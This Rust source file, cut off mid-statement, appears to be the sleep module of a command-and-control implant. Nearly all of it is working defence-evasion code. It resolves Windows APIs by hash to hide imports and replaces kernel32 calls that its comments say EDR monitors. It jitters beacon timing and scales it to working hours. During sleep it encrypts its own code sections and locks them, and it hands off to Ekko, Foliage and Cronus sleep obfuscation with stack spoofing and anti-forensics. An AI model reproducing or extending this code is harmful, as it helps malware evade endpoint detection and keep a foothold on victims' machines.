use anyhow::Result;
use common::config::SleepConfig;
#[cfg(windows)]
use common::config::SleepMethod;
use log::debug;
use log::info;
use rand::{thread_rng, Rng, RngCore as _};

// ── Windows IAT-free constants ────────────────────────────────────────────────
#[cfg(windows)]
mod win_constants {
    pub const PAGE_READWRITE: u32 = 0x04;
    pub const PAGE_NOACCESS: u32 = 0x01;
    pub const MEM_COMMIT: u32 = 0x1000;
    pub const MEM_RESERVE: u32 = 0x2000;
    pub const MEM_RELEASE: u32 = 0x8000;
}
#[cfg(windows)]
use win_constants::*;

// ── Windows pe_resolve helpers ────────────────────────────────────────────────
#[cfg(windows)]
mod win_resolve {
    use anyhow::{anyhow, Result};

    use crate::pe_resolve_macros::hash_str_const;

    // P2-04: Removed HASH_VIRTUALALLOC/HASH_VIRTUALFREE/HASH_VIRTUALPROTECT
    // and their type aliases — all memory operations now use Nt* syscalls.
    pub const HASH_NTALLOCATEVIRTUALMEMORY: u32 = hash_str_const(b"NtAllocateVirtualMemory\0");
    pub const HASH_NTFREEVIRTUALMEMORY: u32 = hash_str_const(b"NtFreeVirtualMemory\0");
    pub const HASH_NTPROTECTVIRTUALMEMORY: u32 = hash_str_const(b"NtProtectVirtualMemory\0");
    pub const HASH_CONVERTTHREADTOFIBER: u32 = hash_str_const(b"ConvertThreadToFiber\0");
    pub const HASH_CREATEFIBER: u32 = hash_str_const(b"CreateFiber\0");
    pub const HASH_SWITCHTOFIBER: u32 = hash_str_const(b"SwitchToFiber\0");
    pub const HASH_CONVERTFIBERTOTHREAD: u32 = hash_str_const(b"ConvertFiberToThread\0");
    pub const HASH_DELETEFIBER: u32 = hash_str_const(b"DeleteFiber\0");
    // P1-02: Removed HASH_SLEEP — kernel32!Sleep is heavily monitored by EDR.
    // Sleep is now performed via NtDelayExecution resolved from ntdll.
    pub const HASH_GETLOCALTIME: u32 = hash_str_const(b"GetLocalTime\0");

    // P2-04: Removed legacy kernel32 FnVirtualAlloc/FnVirtualFree/FnVirtualProtect
    // type aliases — all memory operations now use Nt* syscalls.

    // P2-04: Nt* types for ntdll memory operations.
    // NtAllocateVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*,
    //   AllocationType, Protect) -> NTSTATUS
    pub type FnNtAllocateVirtualMemory = unsafe extern "system" fn(
        usize,                      // ProcessHandle
        *mut *mut std::ffi::c_void, // BaseAddress
        *mut usize,                 // RegionSize
        u32,                        // AllocationType
        u32,                        // Protect
    ) -> i32;
    // NtFreeVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*,
    //   FreeType) -> NTSTATUS
    pub type FnNtFreeVirtualMemory = unsafe extern "system" fn(
        usize,                      // ProcessHandle
        *mut *mut std::ffi::c_void, // BaseAddress
        *mut usize,                 // RegionSize
        u32,                        // FreeType
    ) -> i32;
    // NtProtectVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*,
    //   NewProtect, OldProtect*) -> NTSTATUS
    pub type FnNtProtectVirtualMemory = unsafe extern "system" fn(
        usize,                      // ProcessHandle
        *mut *mut std::ffi::c_void, // BaseAddress
        *mut usize,                 // RegionSize
        u32,                        // NewProtect
        *mut u32,                   // OldProtect
    ) -> i32;
    pub type FnConvertThreadToFiber =
        unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
    pub type FnCreateFiber = unsafe extern "system" fn(
        usize,
        Option<unsafe extern "system" fn(*mut std::ffi::c_void)>,
        *mut std::ffi::c_void,
    ) -> *mut std::ffi::c_void;
    pub type FnSwitchToFiber = unsafe extern "system" fn(*mut std::ffi::c_void);
    pub type FnConvertFiberToThread = unsafe extern "system" fn() -> i32;
    pub type FnDeleteFiber = unsafe extern "system" fn(*mut std::ffi::c_void);
    // P1-02: Removed FnSleep (kernel32!Sleep).  Sleep is now performed via
    // NtDelayExecution (ntdll indirect syscall) to avoid EDR-monitored API.
    pub type FnNtDelayExecution = unsafe extern "system" fn(i32, *mut i64) -> i32;
    pub type FnGetLocalTime = unsafe extern "system" fn(*mut crate::win_types::SYSTEMTIME);

    /// Resolve a kernel32 function by hash.
    pub unsafe fn resolve_kernel32<T>(fn_hash: u32) -> Result<T> {
        let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
            .ok_or_else(|| anyhow!("kernel32 not found"))?;
        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
            .ok_or_else(|| anyhow!("kernel32 API not found (hash 0x{:08X})", fn_hash))?;
        Ok(std::mem::transmute_copy(&addr))
    }

    // P1-02: NtDelayExecution hash for resolving from ntdll instead of
    // kernel32!Sleep, which is heavily monitored by EDR.
    pub const HASH_NTDELAYEXECUTION: u32 = hash_str_const(b"NtDelayExecution\0");

    /// Resolve an ntdll function by hash.
    pub unsafe fn resolve_ntdll<T>(fn_hash: u32) -> Result<T> {
        let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| anyhow!("ntdll not found"))?;
        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
            .ok_or_else(|| anyhow!("ntdll API not found (hash 0x{:08X})", fn_hash))?;
        Ok(std::mem::transmute_copy(&addr))
    }
}
#[cfg(windows)]
use win_resolve::*;

// P1-02: Renamed from SLEEP_PTR.  Holds an NtDelayExecution function pointer
// resolved from ntdll (not kernel32!Sleep) to avoid EDR hooks.
#[cfg(windows)]
static NTDELAY_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
#[cfg(windows)]
static SWITCHTOFIBER_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
    let mut base = config
        .base_interval_ms
        .map(|ms| ms as f64 / 1000.0)
        .unwrap_or(config.base_interval_secs as f64);
    if let (Some(start), Some(end), Some(mult)) = (
        config.working_hours_start,
        config.working_hours_end,
        config.off_hours_multiplier,
    ) {
        let now: u32 = {
            // Use local time for working-hours comparison, not UTC.
            #[cfg(unix)]
            {
                let secs = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs() as libc::time_t;
                unsafe {
                    let mut tm: libc::tm = std::mem::zeroed();
                    let lt = libc::localtime_r(&secs, &mut tm);
                    if lt.is_null() {
                        (secs / 3600 % 24) as u32
                    } else {
                        (*lt).tm_hour as u32
                    }
                }
            }
            #[cfg(windows)]
            {
                let mut st: crate::win_types::SYSTEMTIME = unsafe { std::mem::zeroed() };
                let get_local_time: FnGetLocalTime = unsafe {
                    win_resolve::resolve_kernel32(HASH_GETLOCALTIME)
                        .expect("GetLocalTime resolve failed")
                };
                unsafe { get_local_time(&mut st) };
                st.w_hour as u32
            }
            #[cfg(not(any(unix, windows)))]
            {
                (std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs()
                    / 3600
                    % 24) as u32
            }
        };
        if now < start || now >= end {
            base *= mult as f64;
            debug!("Applying off-hours sleep multiplier: {}", mult);
        }
    }
    let mut rng = thread_rng();
    // Enforce a minimum of ±40% jitter to defeat timing-based sleep detection.
    let jitter_frac = ((config.jitter_percent as f64) / 100.0).max(0.40);
    let jitter_val = base * jitter_frac;
    let offset = rng.gen_range(-jitter_val..=jitter_val);
    std::time::Duration::from_secs_f64((base + offset).max(1.0))
}

#[cfg(windows)]
pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Result<()> {
    match &config.method {
        SleepMethod::Ekko | SleepMethod::Foliage => {
            // Delegate to the advanced sleep_obfuscation module which provides
            // full memory encryption (XChaCha20-Poly1305), stack spoofing,
            // PE header zeroing, and PEB unlinking — superseding the legacy
            // Ekko/Foliage path.
            #[cfg(target_arch = "x86_64")]
            {
                info!("Initiating advanced sleep obfuscation for {:?}", duration);
                let mut soc = crate::sleep_obfuscation::SleepObfuscationConfig::default();
                soc.sleep_duration_ms = duration.as_millis() as u64;
                soc.encrypt_stack = config.sleep_mask_enabled;
                soc.encrypt_heap = false;
                // Key rotation and anti-forensics always active when using
                // the advanced path.
                soc.anti_forensics = true;
                soc.spoof_return_address = true;
                // Ekko/Foliage map to the Ekko variant (NtDelayExecution).
                soc.variant = crate::sleep_obfuscation::SleepVariant::Ekko;
                return unsafe { crate::sleep_obfuscation::secure_sleep(&soc) };
            }
            #[cfg(not(target_arch = "x86_64"))]
            {
                info!("Initiating Foliage-style sleep for {:?}", duration);
                if config.sleep_mask_enabled {
                    unsafe {
                        let mut key = [0u8; 32];
                        rand::thread_rng().fill_bytes(&mut key);
                        let mut sections = stack_mask::encrypt_with_key(&key);
                        std::thread::sleep(duration);
                        stack_mask::decrypt_with_key(&mut sections, &key);
                        core::ptr::write_volatile(&mut key, [0u8; 32]);
                    }
                } else {
                    std::thread::sleep(duration);
                }
                return Ok(());
            }
        }
        SleepMethod::Cronus => {
            // Cronus: waitable-timer-based sleep (NtSetTimer).
            // Falls back to Ekko if timer APIs unavailable.
            #[cfg(target_arch = "x86_64")]
            {
                info!("Initiating Cronus sleep obfuscation for {:?}", duration);
                let mut soc = crate::sleep_obfuscation::SleepObfuscationConfig::default();
                soc.sleep_duration_ms = duration.as_millis() as u64;
                soc.encrypt_stack = config.sleep_mask_enabled;
                soc.encrypt_heap = false;
                soc.anti_forensics = true;
                soc.spoof_return_address = true;
                soc.variant = crate::sleep_obfuscation::SleepVariant::Cronus;
                return unsafe { crate::sleep_obfuscation::secure_sleep(&soc) };
            }
            #[cfg(not(target_arch = "x86_64"))]
            {
                // Fall through to standard sleep on non-x86_64.
                info!("Cronus not supported on non-x86_64, using standard sleep");
                std::thread::sleep(duration);
                return Ok(());
            }
        }
        SleepMethod::HardwareTimer => {
            // Hardware-timer sleep: NtCreateTimer + NtSetTimer +
            // NtWaitForSingleObject.  Avoids NtDelayExecution entirely.
            #[cfg(target_arch = "x86_64")]
            {
                info!("Initiating hardware-timer sleep for {:?}", duration);
                return crate::hw_timer_sleep::hardware_timer_sleep(duration);
            }
            #[cfg(not(target_arch = "x86_64"))]
            {
                info!("HardwareTimer not supported on non-x86_64, using standard sleep");
                std::thread::sleep(duration);
                return Ok(());
            }
        }
        _ => {
            if config.sleep_mask_enabled {
                info!("Sleep-mask active for {:?}", duration);
                unsafe {
                    let mut key = [0u8; 32];
                    rand::thread_rng().fill_bytes(&mut key);
                    let mut sections = stack_mask::encrypt_with_key(&key);
                    std::thread::sleep(duration);
                    stack_mask::decrypt_with_key(&mut sections, &key);
                    core::ptr::write_volatile(&mut key, [0u8; 32]);
                }
            } else {
                info!("Standard sleep for {:?}", duration);
                std::thread::sleep(duration);
            }
            Ok(())
        }
    }
}

/// Non-Windows sleep with optional sleep-mask encryption.
///
/// When `config.sleep_mask_enabled` is `true`, the `.text` and `.rdata`
/// sections are encrypted with a per-sleep ChaCha20 key held on the stack
/// for the duration of the sleep window.  When `false`, the existing
/// `crypto::encrypt_sections` path (heap key page) is used unchanged.
#[cfg(not(windows))]
pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Result<()> {
    if config.sleep_mask_enabled {
        info!("Sleep-mask active (stack-local key) for {:?}", duration);
        unsafe {
            let mut key = [0u8; 32];
            rand::thread_rng().fill_bytes(&mut key);
            let mut sections = stack_mask::encrypt_with_key(&key);
            std::thread::sleep(duration);
            stack_mask::decrypt_with_key(&mut sections, &key);
            // Volatile write to prevent the compiler from treating the zero
            // as a dead store.
            core::ptr::write_volatile(&mut key, [0u8; 32]);
        }
    } else {
        info!("Sleep-time memory encryption active for {:?}", duration);
        crypto::encrypt_sections();
        std::thread::sleep(duration);
        crypto::decrypt_sections();
    }
    Ok(())
}

pub mod crypto {
    use super::*;

    use chacha20poly1305::{
        aead::{Aead, KeyInit, OsRng},
        XChaCha20Poly1305, XNonce,
    };
    use rand::RngCore;

    /// XChaCha20 nonce length (24 bytes).
    const AEAD_NONCE_LEN: usize = 24;
    /// Poly1305 authentication tag length (16 bytes).
    const AEAD_TAG_LEN: usize = 16;

    /// A section whose bytes have been AEAD-encrypted in-place with
    /// XChaCha20-Poly1305.  The ciphertext (same size as plaintext) is written
    /// back to the section; the 16-byte Poly1305 tag and 24-byte nonce are
    /// stored separately so they survive the sleep period in a locked heap
    /// buffer.  Tag verification on wake detects any EDR tampering.
    struct EncryptedSection {
        addr: *mut u8,
        size: usize,
        /// Windows: PAGE_* constant. Unix: libc::PROT_* flags stored as u32.
        orig_prot: u32,
        /// Per-section XChaCha20 nonce (24 bytes).
        nonce: [u8; AEAD_NONCE_LEN],
        /// Poly1305 authentication tag (16 bytes).
        tag: [u8; AEAD_TAG_LEN],
    }

    // P2-05: Zeroize the nonce and tag on drop to prevent lingering key material.
    impl Drop for EncryptedSection {
        fn drop(&mut self) {
            use zeroize::Zeroize;
            self.nonce.zeroize();
            self.tag.zeroize();
        }
    }

    thread_local! {
        /// Pointer to the mmap/VirtualAlloc'd key page.  Null when no session
        /// is active.  The key is stored at offset 0, 32 bytes long, on a page
        /// that is *not* part of the encrypted sections.
        static KEY_PAGE: std::cell::Cell<*mut u8> =
            const { std::cell::Cell::new(std::ptr::null_mut()) };
        static KEY_PAGE_LEN: std::cell::Cell<usize> =
            const { std::cell::Cell::new(0) };
        static SESSION_INITIALIZED: std::cell::Cell<bool> =
            const { std::cell::Cell::new(false) };
        static ENCRYPTED_SECTIONS: std::cell::RefCell<Vec<EncryptedSection>> =
            const { std::cell::RefCell::new(Vec::new()) };
    }

    // ── Key-page allocation / deallocation ───────────────────────────────

    /// Allocate a private anonymous page to hold the 32-byte session key.
    /// Returns (ptr, length) or (null, 0) on failure.
    #[cfg(not(windows))]
    unsafe fn alloc_key_page() -> (*mut u8, usize) {
        let page_size = libc::sysconf(libc::_SC_PAGESIZE);
        let page_size = if page_size > 0 {
            page_size as usize
        } else {
            4096
        };
        let ptr = libc::mmap(
            std::ptr::null_mut(),
            page_size,
            libc::PROT_READ | libc::PROT_WRITE,
            libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
            -1,
            0,
        );
        if ptr == libc::MAP_FAILED {
            log::error!(
                "alloc_key_page: mmap failed: {}",
                std::io::Error::last_os_error()
            );
            return (std::ptr::null_mut(), 0);
        }
        (ptr as *mut u8, page_size)
    }

    /// P2-04: Allocate a private anonymous page via ntdll!NtAllocateVirtualMemory
    /// instead of kernel32!VirtualAlloc to avoid EDR-monitored kernel32 imports.
    #[cfg(windows)]
    unsafe fn alloc_key_page() -> (*mut u8, usize) {
        let nt_alloc: FnNtAllocateVirtualMemory =
            win_resolve::resolve_ntdll(HASH_NTALLOCATEVIRTUALMEMORY)
                .expect("NtAllocateVirtualMemory resolve failed");
        let page_size = 4096usize;
        let mut base: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut region_size = page_size;
        let status = nt_alloc(
            (-1isize) as usize, // NtCurrentProcess()
            &mut base,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if status != 0 || base.is_null() {
            log::error!(
                "alloc_key_page: NtAllocateVirtualMemory failed (status={})",
                status
            );
            return (std::ptr::null_mut(), 0);
        }
        (base as *mut u8, page_size)
    }

    /// Zero the key bytes on the page, then release the page.
    #[cfg(not(windows))]
    unsafe fn free_key_page(page: *mut u8, len: usize) {
        if !page.is_null() && len > 0 {
            // Volatile zero to prevent the optimizer from eliding it.
            std::ptr::write_volatile(page as *mut [u8; 32], [0u8; 32]);
            libc::munmap(page as *mut libc::c_void, len);
        }
    }

    /// P2-04: Release the key page via ntdll!NtFreeVirtualMemory instead of
    /// kernel32!VirtualFree to avoid EDR-monitored kernel32 imports.
    #[cfg(windows)]
    unsafe fn free_key_page(page: *mut u8, _len: usize) {
        if !page.is_null() {
            std::ptr::write_volatile(page as *mut [u8; 32], [0u8; 32]);
            let nt_free: FnNtFreeVirtualMemory =
                win_resolve::resolve_ntdll(HASH_NTFREEVIRTUALMEMORY)
                    .expect("NtFreeVirtualMemory resolve failed");
            let mut base = page as *mut std::ffi::c_void;
            let mut region_size = 0usize;
            let status = nt_free(
                (-1isize) as usize, // NtCurrentProcess()
                &mut base,
                &mut region_size,
                MEM_RELEASE,
            );
            if status != 0 {
                log::error!(
                    "free_key_page: NtFreeVirtualMemory failed (status={})",
                    status
                );
            }
        }
    }

    // ── Memory-protection helpers ─────────────────────────────────────────

    #[cfg(windows)]
    pub(super) unsafe fn protect_region(
        addr: *mut u8,
        size: usize,
        new_protect: u32,
        old_protect: &mut u32,
    ) -> bool {
        let mut region_size = size;
        let mut base_addr = addr as *mut std::ffi::c_void;

        #[cfg(feature = "direct-syscalls")]
        {
            let status = crate::syscalls::syscall_NtProtectVirtualMemory(
                (-1isize) as usize as u64,
                &mut base_addr as *mut _ as usize as u64,
                &mut region_size as *mut _ as usize as u64,
                new_protect as u64,
                old_protect as *mut _ as usize as u64,
            );
            if status != 0 {
                log::error!(
                    "NtProtectVirtualMemory failed for {:p} (size={}) status={}",
                    addr,
                    size,
                    status
                );
                return false;
            }
            true
        }
        // P2-04: Use ntdll!NtProtectVirtualMemory instead of kernel32!VirtualProtect
        // to avoid EDR-monitored kernel32 imports.
        #[cfg(not(feature = "direct-syscalls"))]
        {
            let nt_protect: FnNtProtectVirtualMemory =
                win_resolve::resolve_ntdll(HASH_NTPROTECTVIRTUALMEMORY)
                    .expect("NtProtectVirtualMemory resolve failed");
            let mut prot_base = base_addr;
            let mut prot_size = region_size;
            let status = nt_protect(
                (-1isize) as usize, // NtCurrentProcess()
                &mut prot_base,
                &mut prot_size,
                new_protect,
                old_protect,
            );
            if status != 0 {
                log::error!(
                    "NtProtectVirtualMemory failed for {:p} (size={}) status={}",
                    addr,
                    size,
                    status
                );
                return false;
            }
            true
        }
    }

    #[cfg(not(windows))]
    pub(super) unsafe fn protect_region(addr: *mut u8, size: usize, prot: i32) -> bool {
        let page_size = libc::sysconf(libc::_SC_PAGESIZE);
        let page_size = if page_size > 0 {
            page_size as usize
        } else {
            4096usize
        };
        let aligned = (addr as usize) & !(page_size - 1);
        let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
        if libc::mprotect(aligned as *mut libc::c_void, aligned_size, prot) != 0 {
            log::error!(
                "mprotect failed for {:p} (size={}): {}",
                addr,
                size,
                std::io::Error::last_os_error()
            );
            return false;
        }
        true
    }

    // ── Section discovery ─────────────────────────────────────────────────

    #[cfg(windows)]
    pub(super) unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
        // Local PE structure definitions (avoid winapi dependency)
        #[repr(C)]
        struct IMAGE_DOS_HEADER {
            e_magic: u16,
            _e_cblp: u16,
            _e_cp: u16,
            _e_crlc: u16,
            _e_cparhdr: u16,
            _e_minalloc: u16,
            _e_maxalloc: u16,
            _e_ss: u16,
            _e_sp: u16,
            _e_csum: u16,
            _e_ip: u16,
            _e_cs: u16,
            _e_lfarlc: u16,
            _e_ovno: u16,
            _e_res: [u16; 4],
            _e_oemid: u16,
            _e_oeminfo: u16,
            _e_res2: [u16; 10],
            e_lfanew: i32,
        }
        const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;

        #[repr(C)]
        #[derive(Clone, Copy)]
        union IMAGE_SECTION_HEADER_MISC {
            physical_address: u32,
            virtual_size: u32,
        }

        #[repr(C)]
        struct IMAGE_FILE_HEADER {
            _machine: u16,
            _number_of_sections: u16,
            _time_date_stamp: u32,
            _pointer_to_symbol_table: u32,
            _number_of_symbols: u32,
            _size_of_optional_header: u16,
            _characteristics: u16,
        }

        // We only need the FileHeader from the NT headers for NumberOfSections
        #[repr(C)]
        struct IMAGE_NT_HEADERS64 {
            signature: u32,
            file_header: IMAGE_FILE_HEADER,
            // optional header follows (not accessed directly)
        }
        const IMAGE_NT_SIGNATURE: u32 = 0x4550;

        #[repr(C)]
        struct IMAGE_SECTION_HEADER {
            name: [u8; 8],
            misc: IMAGE_SECTION_HEADER_MISC,
            virtual_address: u32,
            _size_of_raw_data: u32,
            _pointer_to_raw_data: u32,
            _pointer_to_relocations: u32,
            _pointer_to_linenumbers: u32,
            _number_of_relocations: u16,
            _number_of_linenumbers: u16,
            _characteristics: u32,
        }

        impl IMAGE_FILE_HEADER {
            fn number_of_sections(&self) -> u16 {
                self._number_of_sections
            }
        }

        impl IMAGE_SECTION_HEADER_MISC {
            fn virtual_size(&self) -> u32 {
                unsafe { self.virtual_size }
            }
        }

        let mut sections = Vec::new();
        #[cfg(target_arch = "x86_64")]
        let base: *mut std::ffi::c_void = {
            let teb: usize;
            core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, nomem, preserves_flags));
            let peb = *((teb + 0x60) as *const usize) as *const u8;
            *(peb.add(0x10) as *const usize) as *mut _
        };
        #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
        let base: *mut std::ffi::c_void = {
            let teb: usize;
            core::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
            let peb = *((teb + 0x60) as *const usize) as *const u8;
            *(peb.add(0x10) as *const usize) as *mut _
        };
        #[cfg(not(any(
            target_arch = "x86_64",
            all(target_arch = "aarch64", target_os = "windows")
        )))]
        let base: *mut std::ffi::c_void = std::ptr::null_mut();
        if base.is_null() {
            return sections;
        }

        let dos = base as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return sections;
        }

        let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        if (*nt).signature != IMAGE_NT_SIGNATURE {
            return sections;
        }

        let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER;
        for _ in 0..(*nt).file_header.number_of_sections() {
            let name = (*section).name;
            if name[0..5] == [b'.', b't', b'e', b'x', b't']
                || name[0..6] == [b'.', b'r', b'd', b'a', b't', b'a']
            {
                let addr = (base as usize + (*section).virtual_address as usize) as *mut u8;
                let size = (*section).misc.virtual_size() as usize;
                sections.push((addr, size));
            }
            section = (section as usize + std::mem::size_of::<IMAGE_SECTION_HEADER>()) as *const _;
        }
        sections
    }

    /// Parse /proc/self/maps to find executable and read-only sections belonging
    /// to the current binary.  Returns (addr, size, original_prot) tuples.
    #[cfg(not(windows))]
    pub(super) unsafe fn get_code_sections() -> Vec<(*mut u8, usize, i32)> {
        use std::io::{BufRead, BufReader};
        let exe_path = match std::env::current_exe() {
            Ok(p) => p.to_string_lossy().to_string(),
            Err(_) => return Vec::new(),
        };
        let f = match std::fs::File::open("/proc/self/maps") {
            Ok(f) => f,
            Err(_) => return Vec::new(),
        };
        let mut sections = Vec::new();
        for line in BufReader::new(f).lines().map_while(Result::ok) {
            if !line.contains("r-xp") && !line.contains("r--p") {
                continue;
            }
            if !line.contains(&exe_path) {
                continue;
            }
            let mut fields = line.split_whitespace();
            let addr_range = match fields.next() {
                Some(r) => r,
                None => continue,
            };
            let perms = match fields.next() {
                Some(p) => p,
                None => continue,
            };
            let orig_prot = {
                let exec = perms.as_bytes().get(2).copied() == Some(b'x');
                if exec {
                    libc::PROT_READ | libc::PROT_EXEC
                } else {
                    libc::PROT_READ
                }
            };
            let mut parts = addr_range.splitn(2, '-');
            let start_hex = parts.next().unwrap_or("0");
            let end_hex = parts.next().unwrap_or("0");
            let start = usize::from_str_radix(start_hex, 16).unwrap_or(0);
            let end = usize::from_str_radix(end_hex, 16).unwrap_or(0);
            if start == 0 || end <= start {
                continue;
            }
            sections.push((start as *mut u8, end - start, orig_prot));
        }
        sections
    }

    // ── Core encrypt / decrypt (Windows) ─────────────────────────────────

    #[cfg(windows)]
    pub fn encrypt_sections() {
        #[cfg(feature = "memory-guard")]
        {
            let _ = crate::memory_guard::guard_memory();
            return;
        }

        #[cfg(not(feature = "memory-guard"))]
        unsafe {
            ENCRYPTED_SECTIONS.with(|s| {
                s.borrow_mut().clear();
            });
            SESSION_INITIALIZED.with(|c| c.set(false));

            // Allocate a separate page to hold the session key.
            let (kp, kplen) = alloc_key_page();
            if kp.is_null() {
                log::error!("encrypt_sections: failed to allocate key page — aborting");
                return;
            }

            // Generate a 32-byte random key using OsRng and write to the key page.
            let mut key = [0u8; 32];
            OsRng.fill_bytes(&mut key);
            std::ptr::copy_nonoverlapping(key.as_ptr(), kp, 32);
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);

            KEY_PAGE.with(|c| c.set(kp));
            KEY_PAGE_LEN.with(|c| c.set(kplen));

            let mut encrypted_count = 0usize;
            for (addr, size) in get_code_sections() {
                if addr.is_null() || size == 0 {
                    continue;
                }

                let mut old_protect = 0u32;
                if !protect_region(addr, size, PAGE_READWRITE, &mut old_protect) {
                    continue;
                }

                // Generate a fresh per-section 24-byte XChaCha20 nonce via OsRng.
                let mut nonce_bytes = [0u8; AEAD_NONCE_LEN];
                OsRng.fill_bytes(&mut nonce_bytes);

                // Read key from the key page, encrypt with XChaCha20-Poly1305.
                let mut key_copy = [0u8; 32];
                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                let tag = {
                    let cipher = XChaCha20Poly1305::new_from_slice(&key_copy)
                        .expect("key length is 32 bytes");
                    let nonce = XNonce::from_slice(&nonce_bytes);
                    let plaintext = std::slice::from_raw_parts(addr, size);
                    // AEAD encrypt produces ciphertext + 16-byte tag.
                    let mut ct_and_tag = cipher
                        .encrypt(nonce, plaintext)
                        .expect("XChaCha20-Poly1305 encryption failed");
                    // Copy ciphertext (without tag) back to the section in-place.
                    std::ptr::copy_nonoverlapping(ct_and_tag.as_ptr(), addr, size);
                    // Extract the 16-byte Poly1305 tag from the tail.
                    let mut tag = [0u8; AEAD_TAG_LEN];
                    tag.copy_from_slice(&ct_and_tag[size..]);
                    // Zero the temporary AEAD output.
                    zeroize::Zeroize::zeroize(&mut ct_and_tag);
                    tag
                };
                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);

                // Lock the section down to NOACCESS.
                let mut temp = 0u32;
                if !protect_region(addr, size, PAGE_NOACCESS, &mut temp) {
                    // Could not lock — decrypt the section so it is sane again.
                    if protect_region(addr, size, old_protect, &mut temp) {
                        let mut key_copy2 = [0u8; 32];
                        std::ptr::copy_nonoverlapping(kp, key_copy2.as_mut_ptr(), 32);
                        let cipher2 = XChaCha20Poly1305::new_from_slice(&key_copy2)
                            .expect("key length is 32 bytes");
                        let nonce2 = XNonce::from_slice(&nonce_bytes);
                        // Reassemble ciphertext + tag for decryption.
                        let mut ct_and_tag2 = Vec::with_capacity(size + AEAD_TAG_LEN);
                        std::ptr::copy_nonoverlapping(addr, ct_and_tag2.as_mut_ptr(), size);
                        ct_and_tag2.set_len(size);
                        ct_and_tag2.extend_from_slice(&tag);
                        if let Ok(pt) = cipher2.decrypt(nonce2, ct_and_tag2.as_slice()) {
                            std::ptr::copy_nonoverlapping(pt.as_ptr(), addr, size);
                        }
                        std::ptr::write_volatile(&mut key_copy2 as *mut _, [0u8; 32]);
                    }
                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; AEAD_NONCE_LEN]);
                    continue;
                }

                ENCRYPTED_SECTIONS.with(|s| {
                    s.borrow_mut().push(EncryptedSection {
                        addr,
                        size,
                        orig_prot: old_protect,
                        nonce: nonce_bytes,
                        tag,
                    });
                });
                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; AEAD_NONCE_LEN]);
                encrypted_count += 1;
            }

            if encrypted_count > 0 {
                SESSION_INITIALIZED.with(|c| c.set(true));
            } else {
                // Nothing was encrypted — release the key page now.
                free_key_page(kp, kplen);
                KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
                KEY_PAGE_LEN.with(|c| c.set(0));
            }
        }
    }

    #[cfg(windows)]
    pub fn decrypt_sections() {
        #[cfg(feature = "memory-guard")]
        {
            let _ = crate::memory_guard::unguard_memory();
            return;
        }

        #[cfg(not(feature = "memory-guard"))]
        unsafe {
            if !SESSION_INITIALIZED.with(|c| c.get()) {
                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
                return;
            }
            SESSION_INITIALIZED.with(|c| c.set(false));

            let kp = KEY_PAGE.with(|c| c.get());
            let kplen = KEY_PAGE_LEN.with(|c| c.get());

            let sections = ENCRYPTED_SECTIONS.with(|s| std::mem::take(&mut *s.borrow_mut()));
            for mut section in sections {
                if section.addr.is_null() || section.size == 0 {
                    continue;
                }

                let mut rw_prev = 0u32;
                if !protect_region(section.addr, section.size, PAGE_READWRITE, &mut rw_prev) {
                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);
                    continue;
                }

                // Reassemble ciphertext + tag, then AEAD-decrypt with tag verification.
                let mut key_copy = [0u8; 32];
                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                {
                    let cipher = XChaCha20Poly1305::new_from_slice(&key_copy)
                        .expect("key length is 32 bytes");
                    let nonce = XNonce::from_slice(&section.nonce);
                    // Build the ciphertext || tag buffer expected by the AEAD.
                    let mut ct_and_tag = Vec::with_capacity(section.size + AEAD_TAG_LEN);
                    std::ptr::copy_nonoverlapping(
                        section.addr,
                        ct_and_tag.as_mut_ptr(),
                        section.size,
                    );
                    ct_and_tag.set_len(section.size);
                    ct_and_tag.extend_from_slice(&section.tag);

                    match cipher.decrypt(nonce, ct_and_tag.as_slice()) {
                        Ok(plaintext) => {
                            std::ptr::copy_nonoverlapping(
                                plaintext.as_ptr(),
                                section.addr,
                                section.size,
                            );
                        }
                        Err(_) => {
                            // Poly1305 tag verification FAILED — the encrypted
                            // section was tampered with during sleep.  Executing
                            // tampered code is unacceptable; terminate immediately.
                            log::error!(
                                "decrypt_sections: Poly1305 tag verification FAILED for section at {:p} \
                                 — possible EDR tampering detected. Terminating process.",
